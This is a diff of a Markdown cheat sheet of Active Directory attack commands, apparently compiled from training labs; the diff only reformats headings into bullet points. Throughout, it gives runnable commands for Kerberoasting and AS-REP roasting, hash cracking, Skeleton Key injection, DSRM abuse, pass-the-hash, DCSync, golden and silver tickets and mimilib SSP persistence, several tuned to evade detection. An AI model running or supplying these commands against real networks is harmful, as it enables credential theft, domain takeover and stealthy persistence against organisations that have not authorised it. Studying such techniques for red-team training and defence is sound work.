@@ -775,114 +775,114 @@ THM{Runa5S4veCr3ds}
 
 ## Kerberoasting:
 Find user accounts used as Service accounts there is no need that this service is actually running a service on a machine, if it has the SPN property populated it is a service acc(as a domain user you can request any tgs without having special privileges)
-## ActiveDirectory module
+- **ActiveDirectory module**
 `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`
-## PowerView
+- **PowerView**
 `Get-DomainUser–SPN`
 
-## Use Rubeus to list Kerberoast stats
+- **Use Rubeus to list Kerberoast stats**
 `Rubeus.exe kerberoast /stats`
-## Use Rubeus to request a TGS
+- **Use Rubeus to request a TGS**
 `Rubeus.exe kerberoast /user:svcadmin /simple`
-## To avoid detections based on Encryption Downgrade for Kerberos EType (used by likes of ATA - 0x17 stands for rc4-hmac), look for Kerberoastable accounts that only support RC4_HMAC
+- **To avoid detections based on Encryption Downgrade for Kerberos EType (used by likes of ATA - 0x17 stands for rc4-hmac), look for Kerberoastable accounts that only support RC4_HMAC**
 `Rubeus.exe kerberoast /stats /rc4opsec` (Recommended one)
 `Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec`
-## Kerberoast all possible accounts
+- **Kerberoast all possible accounts**
 `Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt`
 
-## Kerberoasting - AS-REPs  you might face that in cases of Oracle,products,workstations that are not windows,or some vpn staff) Enumerating accounts with Kerberos Preauth disabled (https://github.com/HarmJ0y/ASREPRoast)
-## Using PowerView:
+- **Kerberoasting - AS-REPs  you might face that in cases of Oracle,products,workstations that are not windows,or some vpn staff) Enumerating accounts with Kerberos Preauth disabled (https://github.com/HarmJ0y/ASREPRoast)**
+- **Using PowerView:**
 `Get-DomainUser -PreauthNotRequired -Verbose`
-## Using ActiveDirectory module:
+- **Using ActiveDirectory module:**
 `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth`
-## If our user has permissions to Force disable Kerberos Preauth maybe on another user group we can do that: Let's enumerate the permissions for RDPUsers on ACLs using PowerView and disable pre-auth on Controlusers:
+- **If our user has permissions to Force disable Kerberos Preauth maybe on another user group we can do that: Let's enumerate the permissions for RDPUsers on ACLs using PowerView and disable pre-auth on Controlusers:**
 `Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}` 
 `Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} –Verbose`
 `Get-DomainUser -PreauthNotRequired -Verbose`
 
-##  Request encrypted AS-REP for offline brute-force. Let's use ASREPRoast
+- **Request encrypted AS-REP for offline brute-force. Let's use ASREPRoast**
 `Get-ASREPHash -UserName VPN1user -Verbose`
-## To enumerate all users with Kerberos preauth disabled and request a hash
+- **To enumerate all users with Kerberos preauth disabled and request a hash**
 `Invoke-ASREPRoast -Verbose`
-## We can use John The Ripper to brute-force the hashes offline
+- **We can use John The Ripper to brute-force the hashes offline**
 `john.exe --wordlist=C:\\AD\\Tools\\kerberoast\\10k-worst-pass.txt C:\\AD\\Tools\\asrephashes.txt`
 
-## You can request TGS for every account SPN not set to null With enough rights (GenericAll/GenericWrite), a target user's SPN can be set to anything (unique in the forest and should be like "random/whoami1" random would be the service name and whoami1 would be the FQDN of the target server) We can then request a TGS without special privileges. The TGS can then be "Kerberoasted"
+- **You can request TGS for every account SPN not set to null With enough rights (GenericAll/GenericWrite), a target user's SPN can be set to anything (unique in the forest and should be like "random/whoami1" random would be the service name and whoami1 would be the FQDN of the target server) We can then request a TGS without special privileges. The TGS can then be "Kerberoasted"**
 
-## Let's enumerate the permissions for RDPUsers on ACLs using PowerView (dev):
+- **Let's enumerate the permissions for RDPUsers on ACLs using PowerView (dev):**
 `Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}`
-## Using Powerview (dev), see if the user already has a SPN:
+- **Using Powerview (dev), see if the user already has a SPN:**
 `Get-DomainUser -Identity supportuser | select serviceprincipalname`
-## Using ActiveDirectory module:
+- **Using ActiveDirectory module:**
 `Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName`
 
-## Set a SPN for the user (as said above)
+- **Set a SPN for the user (as said above)**
 `Set-DomainObject -Identity support1user -Set @{serviceprincipalname='ops/whatever1'}`
-## Using ActiveDirectory module:
+- **Using ActiveDirectory module:**
 `Set-ADUser -Identity support1user -ServicePrincipalNames @{Add='ops/whatever1'}`
 
-## Kerberoast the user
+- **Kerberoast the user**
 `Rubeus.exe kerberoast /outfile:targetedhashes.txt`
 
-# Kerberoasting with impacket
+- **Kerberoasting with impacket**
 `python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP THM.red/OXI` *Enumerating for SPN Accounts*
 `python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP THM.red/OXI -request-user svc-user` *Requesting a TGS Ticket as SPN Account*
 
-# AS-REP Roasting
+- **AS-REP Roasting**
 `python3.9 /opt/impacket/examples/GetNPUsers.py -dc-ip MACHINE_IP OXI.red/ -usersfile /tmp/users.txt` *Performing an AS-REP Roasting Attack against Users List*
 
-##  When running Commands for finding local admin rights on other machines is also noisy.
-# Find all machines on the current domain where the current user has local admin access (also Find-WMILocalAdminAccess.ps1 and Find-PSRemotingLocalAdminAccess.ps1)
+- **When running Commands for finding local admin rights on other machines is also noisy.**
+- **Find all machines on the current domain where the current user has local admin access (also Find-WMILocalAdminAccess.ps1 and Find-PSRemotingLocalAdminAccess.ps1)**
 `Find-LocalAdminAccess–Verbose`
-# Find computers where a domain admin (or specified user/group) has sessions:
+- **Find computers where a domain admin (or specified user/group) has sessions:**
 `Find-DomainUserLocation -Verbose`
 `Find-DomainUserLocation -UserGroupIdentity "RDPUsers"`
 
-# Find computers where a domain admin session is available and current user has admin access (uses Test-AdminAccess).
+- **Find computers where a domain admin session is available and current user has admin access (uses Test-AdminAccess).**
 `Find-DomainUserLocation -CheckAccess`
 
-# Skeleton Key (too much noise for nothing) Use the below command to inject a skeleton key (password would be mimikatz, want to change that change mimi source code and put ur own) on a Domain Controller of choice. DA privileges required
+- **Skeleton Key (too much noise for nothing) Use the below command to inject a skeleton key (password would be mimikatz, want to change that change mimi source code and put ur own) on a Domain Controller of choice. DA privileges required**
 `Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local`
-# Now, it is possible to access any machine with a valid username and password as "mimikatz"
+- **Now, it is possible to access any machine with a valid username and password as "mimikatz"**
 `Enter-PSSession–Computername dcorp-dc–credential dcorp\\Administrator`
 
-# There is a local administrator on every DC called DSRM "Administrator" whose password is the DSRM password. DSRM password (SafeModePassword) is required when a server is promoted to Domain Controller and it is rarely changed. Dump DSRM password (needs DA privs)
+- **There is a local administrator on every DC called DSRM "Administrator" whose password is the DSRM password. DSRM password (SafeModePassword) is required when a server is promoted to Domain Controller and it is rarely changed. Dump DSRM password (needs DA privs)**
 `Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername dcorp-dc`
-# Compare the Administrator hash with the Administrator hash of below command
+- **Compare the Administrator hash with the Administrator hash of below command**
 `Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc`
-# But, the Logon Behavior for the DSRM account needs to be changed before we can use its hash
+- ** But, the Logon Behavior for the DSRM account needs to be changed before we can use its hash**
 `Enter-PSSession -Computername dcorp-dc`
 `New-ItemProperty "HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD` (WHAT ARE YOU DOING you are making a user not allowed to logon remote to do so, you are not supposed to introduce extra vulns, stop it get some help !)
 
 ## PASS THE HASH/OVERPASS THE HASH AND ETC MIMIKATZ
 
-# Over Pass the hash (OPTH) generate tokens from hashes or keys. Needs elevation(Run as administrator)
+- **Over Pass the hash (OPTH) generate tokens from hashes or keys. Needs elevation(Run as administrator)**
 `Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"'`
 
 `SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"`
-## The above commands starts a PowerShell session with a logon type 9 (same as runas /netonly).
+- **The above commands starts a PowerShell session with a logon type 9 (same as runas /netonly).**
 
-#  Below doesn't need elevation ( This overwrites the current tickets)
+- **Below doesn't need elevation ( This overwrites the current tickets)**
 `Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt`
-#  Below command needs elevation ( This starts a new process and if you run whoami you will not see ur impersonated admin privs. Because the proccess starts with logon type 9 so new credentials are used when you access network resources !)
+- **Below command needs elevation ( This starts a new process and if you run whoami you will not see ur impersonated admin privs. Because the proccess starts with logon type 9 so new credentials are used when you access network resources !)**
 `Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`
 
-# To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges for us domain:
+- **To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges for us domain:**
 `Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'`
 `SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"`
 
-# Execute mimikatz on DC as DA to get krbtgt hash
+- **Execute mimikatz on DC as DA to get krbtgt hash**
 `Invoke-Mimikatz -Command '"lsadump::lsa /patch"'–Computername dcorp-dc`
 
 # Golden ticket :
 `Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"`
-## Explanation : name of the module, Username for which the TGT is generated (use an active domain admin with high logon count), Domain FQDN, SID of the domain, NTLM (RC4) hash of the krbtgt account or Use /aes128 and /aes256 for using AES keys which is MORE SILENT, Optional User RID (default 500) and Group default 513 512 520 518 519), Injects the ticket in current PowerShell process - no need to save the ticket on disk(Stealthier due the time validation time taken to validate the TGT), Optional when the ticket is available (default 0 - right now) in minutes. Use negative for a ticket available from past and a larger number for future, Optional ticket lifetime (default is 10 years) in minutes.The default AD setting is 10 hours = 600 minutes, Optional ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800*
+- **Explanation : name of the module, Username for which the TGT is generated (use an active domain admin with high logon count), Domain FQDN, SID of the domain, NTLM (RC4) hash of the krbtgt account or Use /aes128 and /aes256 for using AES keys which is MORE SILENT, Optional User RID (default 500) and Group default 513 512 520 518 519), Injects the ticket in current PowerShell process - no need to save the ticket on disk(Stealthier due the time validation time taken to validate the TGT), Optional when the ticket is available (default 0 - right now) in minutes. Use negative for a ticket available from past and a larger number for future, Optional ticket lifetime (default is 10 years) in minutes.The default AD setting is 10 hours = 600 minutes, Optional ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800**
 
-# Silver ticket (Similar command can be used for any other service on a machine.Which services? HOST, RPCSS, HTTP and many more):
+- **Silver ticket (Similar command can be used for any other service on a machine.Which services? HOST, RPCSS, HTTP and many more):**
 `Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:6f5b5acaf7433b3282ac22e21e62ff22 /user:Administrator /ptt"'` 
-## The only diff with the command above is this : /target:dcorp-dc.dollarcorp.moneycorp.local Target server FQDN, /service:cifs The SPN name of service for which TGS is to be created)
+- **The only diff with the command above is this : /target:dcorp-dc.dollarcorp.moneycorp.local Target server FQDN, /service:cifs The SPN name of service for which TGS is to be created)**
 
-# Mimikatz provides a custom SSP - mimilib.dll. This SSP logs local logons, service account and machine account passwords in clear text on the target server. Drop the mimilib.dll to system32 and add mimilib to HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages. All local logons on the DC are logged to C:\Windows\system32\kiwissp.log
+- **Mimikatz provides a custom SSP - mimilib.dll. This SSP logs local logons, service account and machine account passwords in clear text on the target server. Drop the mimilib.dll to system32 and add mimilib to HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages. All local logons on the DC are logged to C:\Windows\system32\kiwissp.log**
 `$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages'
 $packages += "mimilib"
 Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
@@ -903,8 +903,8 @@ https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#
 - WriteDACL: Write new ACEs to the target object's DACL, possibly granting full control over the object.
 - AllExtendedRights: Perform any action with extended AD rights against the target object, such as force changing a user's password.
 
-## AD-RSAT for permission delegation
-### Add-ADGroupMember 
+- **AD-RSAT for permission delegation**
+- **Add-ADGroupMember**
 ```powershell
 $user = Get-ADUser -Identity 'user.name'
 $group = Get-ADGroup -Identity 'IT Support'
